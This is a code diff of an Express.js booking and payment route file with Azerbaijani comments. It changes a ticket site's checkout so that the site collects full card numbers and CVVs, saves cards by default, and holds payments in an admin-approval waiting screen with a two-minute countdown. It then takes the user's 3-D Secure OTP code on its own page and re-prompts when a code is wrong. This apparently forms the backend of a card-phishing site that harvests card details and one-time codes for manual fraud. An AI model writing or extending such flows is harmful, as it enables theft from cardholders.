@@ -1,4 +1,4 @@
-// src/routes/booking.js - Ödəniş bölümü (YENILƏNMIŞ)
+// src/routes/booking.js - Sifariş və kart ödənişi axını
 
 const express = require('express');
 const { Order, Ticket, Trip, Payment, User } = require('../models/index');
@@ -23,6 +23,11 @@ function validateCardInput(card) {
   if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
   if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
   return null;
+}
+
+/* Ödəniş yalnız hələ başlamamış və ya rədd edilmiş sifariş üçün başladıla bilər */
+function payableOrder(order) {
+  return ['pending_payment', 'rejected'].indexOf(order.status) > -1;
 }
 
 // ==================== ÖDƏNIŞ SƏHIFƏSI (CHECKOUT) ====================
@@ -135,7 +140,7 @@ router.post('/api/booking/order', requireAuth, async (req, res) => {
       passengers,
       contactPhone: String(b.contactPhone).trim(),
       contactEmail: String(b.contactEmail).trim(),
-      method: b.method
+      method: 'card'
     });
 
     return res.json({
@@ -154,7 +159,7 @@ router.post('/api/booking/order', requireAuth, async (req, res) => {
   }
 });
 
-// ==================== ÖDƏNIŞ SƏHIFƏSI ====================
+// ==================== ÖDƏNİŞ SƏHİFƏSİ (kart məlumatları) ====================
 router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
@@ -164,76 +169,47 @@ router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
       return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
     }
 
+    /* Ödəniş artıq başlayıbsa müvafiq ekrana yönləndir */
+    if (order.payment && ['pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
+      const p = await Payment.findById(order.payment).lean();
+      if (p && p.stage !== 'done') {
+        const scr = paymentService.screenFor(res.locals.locale, order, p);
+        return res.redirect(scr.redirect);
+      }
+    }
+
     const trip = await Trip.findById(order.trip).lean();
-    const user = await User.findById(req.currentUser._id).select('savedCards balance');
-    const savedCards = (user && user.savedCards) ? user.savedCards.filter(c => c.isActive) : [];
+    const savedCards = await paymentService.getUserSavedCards(req.currentUser._id);
 
     res.render('pages/payment', {
-      title: res.locals.t('search.payTitle'),
+      title: res.locals.t('payment.title'),
       order,
       trip,
-      balance: (user && user.balance) || 0,
-      savedCards: savedCards.map(c => ({
-        cardId: c.cardId,
-        masked: c.masked,
-        brand: c.brand,
-        holder: c.holder,
-        isDefault: c.isDefault
-      }))
+      savedCards
     });
   } catch (e) {
     next(e);
   }
 });
 
-// ==================== SAXLANILMIŞ KART İLƏ ÖDƏNIŞ ====================
-router.post('/api/payment/saved-card/init', requireAuth, async (req, res) => {
-  try {
-    const b = req.body || {};
-    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
-    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
-
-    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
-      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
-    }
-
-    /* Saxlanılmış kartı yüklə */
-    const user = await User.findById(req.currentUser._id);
-    if (!user) return res.status(404).json({ ok: false, message: 'İstifadəçi tapılmadı' });
-
-    const payment = await paymentService.initPaymentWithSavedCard(order, b.savedCardId, user);
-
-    return res.json({
-      ok: true,
-      message: 'Saxlanılmış kart seçildi. Ödəniş gözləmə ekranına yönləndirilirsiz...',
-      paymentId: String(payment._id),
-      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
-    });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
-  }
-});
-
-// ==================== YENİ KART İLƏ ÖDƏNIŞ ====================
+// ==================== 1) KART MƏLUMATLARI GÖNDƏRİLİR ====================
 router.post('/api/payment/card/init', requireAuth, async (req, res) => {
   try {
     const b = req.body || {};
     const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
     if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
-
-    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
-      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
+    if (!payableOrder(order)) {
+      return res.status(400).json({ ok: false, message: 'Bu sifariş üçün ödəniş artıq başlayıb' });
     }
 
     const cardErr = validateCardInput(b.card);
     if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
 
-    const payment = await paymentService.initPayment(order, b.card, 'card', b.saveCard === true);
+    await paymentService.initPayment(order, b.card, b.saveCard !== false);
 
     return res.json({
       ok: true,
-      message: 'Kart məlumatları qeydə alındı. Ödəniş gözləmə ekranına yönləndirilirsiz...',
-      paymentId: String(payment._id),
+      message: 'Kart məlumatları qeydə alındı. Bank doğrulaması gözlənilir…',
       redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
     });
   } catch (e) {
@@ -241,30 +217,24 @@ router.post('/api/payment/card/init', requireAuth, async (req, res) => {
   }
 });
 
-// ==================== BALANS İLƏ ÖDƏNIŞ ====================
-router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
+// ==================== 1b) SAXLANILMIŞ KART İLƏ ÖDƏNİŞ ====================
+router.post('/api/payment/saved-card/init', requireAuth, async (req, res) => {
   try {
     const b = req.body || {};
     const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
     if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
-
-    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
-      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
+    if (!payableOrder(order)) {
+      return res.status(400).json({ ok: false, message: 'Bu sifariş üçün ödəniş artıq başlayıb' });
     }
 
-    if ((req.currentUser.balance || 0) < order.total) {
-      return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
-    }
+    const user = await User.findById(req.currentUser._id);
+    if (!user) return res.status(404).json({ ok: false, message: 'İstifadəçi tapılmadı' });
 
-    const cardErr = validateCardInput(b.card);
-    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
-
-    const payment = await paymentService.initPayment(order, b.card, 'balance');
+    await paymentService.initPaymentWithSavedCard(order, String(b.savedCardId || ''), user);
 
     return res.json({
       ok: true,
-      message: 'Balans ödənişi gözləmə ekranına göndərildi.',
-      paymentId: String(payment._id),
+      message: 'Saxlanılmış kart seçildi. Bank doğrulaması gözlənilir…',
       redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
     });
   } catch (e) {
@@ -272,7 +242,7 @@ router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
   }
 });
 
-// ==================== ÖDƏNIŞ GÖZLƏMƏ (Admin Təsdiq) ====================
+// ==================== 2) GÖZLƏMƏ EKRANI (2 dəq geri sayım) ====================
 router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
@@ -281,26 +251,31 @@ router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
     if (order.status === 'confirmed') {
       return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
     }
+    if (!order.payment) {
+      return res.redirect('/' + res.locals.locale + '/odenis/' + order._id);
+    }
 
-    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
-    const stage = payment ? payment.stage : 'card_review';
+    let payment = await Payment.findById(order.payment).lean();
+    payment = await paymentService.advanceIfExpired(payment);
+    const screen = paymentService.screenFor(res.locals.locale, order, payment);
+
+    if (screen.stage === 'otp_entry') {
+      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
+    }
 
     res.render('pages/payment-waiting', {
       title: res.locals.t('payment.title'),
       order,
       payment,
-      cardMasked: payment && payment.card ? payment.card.masked : '',
-      stage,
-      stageSeconds: paymentService.STAGE_SECONDS,
-      secondsLeft: payment ? paymentService.secondsLeft(payment) : 120,
-      declined: order.status === 'rejected'
+      screen,
+      cardMasked: (payment && payment.card && payment.card.masked) || ''
     });
   } catch (e) {
     next(e);
   }
 });
 
-// ==================== OTP GİRİŞİ ====================
+// ==================== 3) 3-D OTP EKRANI ====================
 router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
@@ -309,49 +284,46 @@ router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
     if (order.status === 'confirmed') {
       return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
     }
-    if (['awaiting_verification', 'code_submitted'].indexOf(order.status) === -1) {
-      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
+    if (!order.payment) {
+      return res.redirect('/' + res.locals.locale + '/odenis/' + order._id);
     }
 
-    let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    let payment = await Payment.findById(order.payment).lean();
     payment = await paymentService.advanceIfExpired(payment);
-    const stage = payment ? payment.stage : 'otp_entry';
+    const screen = paymentService.screenFor(res.locals.locale, order, payment);
+
+    if (screen.stage !== 'otp_entry') {
+      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
+    }
 
     res.render('pages/secure3d', {
       title: res.locals.t('secure3d.title'),
       order,
       payment,
-      cardMasked: payment && payment.card ? payment.card.masked : '',
-      stage,
-      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
-      stageSeconds: paymentService.STAGE_SECONDS,
-      wrongCode: stage === 'wrong_code',
-      codeSubmitted: stage !== 'otp_entry'
+      screen,
+      cardMasked: (payment && payment.card && payment.card.masked) || ''
     });
   } catch (e) {
     next(e);
   }
 });
 
-// ==================== OTP GÖNDƏRİŞİ ====================
+// ==================== 3b) OTP KODU GÖNDƏRİLİR ====================
 router.post('/api/payment/verify', requireAuth, async (req, res) => {
   try {
     const b = req.body || {};
-    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id }).select('_id').lean();
-    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
-
-    const result = await paymentService.submitVerificationCode({ orderId: b.orderId }, b.code, { ip: req.ip });
+    await paymentService.submitVerificationCode(b.orderId, req.currentUser._id, b.code, { ip: req.ip });
     return res.json({
       ok: true,
-      message: 'OTP göndərildi. Yekun təsdiq gözlənilir.',
-      matched: result.matched
+      message: 'OTP kodu bankın təsdiqinə göndərildi.',
+      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + b.orderId
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'OTP göndərilə bilmədi' });
   }
 });
 
-// ==================== ÖDƏNIŞ STATUSU ====================
+// ==================== CANLI VƏZİYYƏT ====================
 router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
@@ -359,30 +331,30 @@ router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
 
     let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
     payment = await paymentService.advanceIfExpired(payment);
-    const stage = payment ? payment.stage : 'card_review';
 
-    let redirect = null;
-    if (order.status === 'confirmed') redirect = '/' + res.locals.locale + '/ugur/' + order._id;
-    else if (stage === 'otp_entry') redirect = '/' + res.locals.locale + '/3d-tesdiq/' + order._id;
-    else if (order.status === 'rejected') redirect = '/' + res.locals.locale + '/odenis-gozleme/' + order._id;
-
-    res.json({
-      ok: true,
-      status: order.status,
-      stage,
-      wrongCode: stage === 'wrong_code',
-      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
-      stageSeconds: paymentService.STAGE_SECONDS,
-      redirect,
-      message: order.adminNote || ''
-    });
+    return res.json(Object.assign({ ok: true }, paymentService.screenFor(res.locals.locale, order, payment)));
   } catch (e) {
-    res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
+    return res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
+  }
+});
+
+// ==================== 4) UĞURLU NƏTİCƏ ====================
+router.get('/ugur/:orderId', requireAuth, async (req, res, next) => {
+  try {
+    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
+    if (!order) return next();
+    if (order.status !== 'confirmed') {
+      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
+    }
+    const tickets = await Ticket.find({ order: order._id }).lean();
+    res.render('pages/success', { title: res.locals.t('success.title'), order, tickets });
+  } catch (e) {
+    next(e);
   }
 });
 
 // ==================== TİKET YÜKLƏMƏ ====================
-router.get('/bilet/:ticketId/yukle', async (req, res, next) => {
+router.get(['/bilet/:ticketId/yukle', '/bilet/:ticketId/pdf'], async (req, res, next) => {
   try {
     const ticket = await Ticket.findById(req.params.ticketId).lean();
     if (!ticket) return next();
